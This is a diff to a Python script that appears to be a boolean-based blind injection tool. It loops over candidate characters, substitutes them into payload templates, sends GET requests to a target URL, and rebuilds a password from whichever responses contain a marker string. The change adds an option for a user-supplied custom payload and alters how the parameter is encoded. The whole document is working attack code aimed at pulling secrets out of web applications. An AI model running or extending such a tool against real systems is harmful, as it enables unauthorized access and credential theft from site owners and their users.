@@ -63,8 +63,13 @@ def Get_Boolean(p):
             list=[]        
             for ch in f1:                
                 print(ch)
-                list.append(ch)           
-            user_ch = int(input("your choice : "))
+                list.append(ch)
+            print("99. custom payload")           
+            user_ch = int(input("your choice : "))            
+            if user_ch == 99:
+                pw_choose = "1." + input("payload : ")
+            else:
+                pw_choose = list[user_ch]
             sp = input("special: ")
             len_pw = int(input("length :"))
             password = ""
@@ -72,8 +77,8 @@ def Get_Boolean(p):
             for i in range(1,len_pw):
                 for j in char:
                     pass_1 = password + j
-                    pw  = list[user_ch].replace("{pw}",s_p).replace("{i}",str(i)).replace("{j}" , pass_1).replace("\n","")
-                    get = session.get(url = url , headers=header , params={p : pw[2:]})            
+                    pw  = pw_choose.replace("{pw}",s_p).replace("{i}",str(i)).replace("{j}" , pass_1).replace("\n","")
+                    get = session.get(url = url , headers=header , params=f"{p}={pw[2:]}")            
                     if (sp in get.text):
                         print(len(get.text) , pw[2:] ,get.url)                      
                         password = password + j
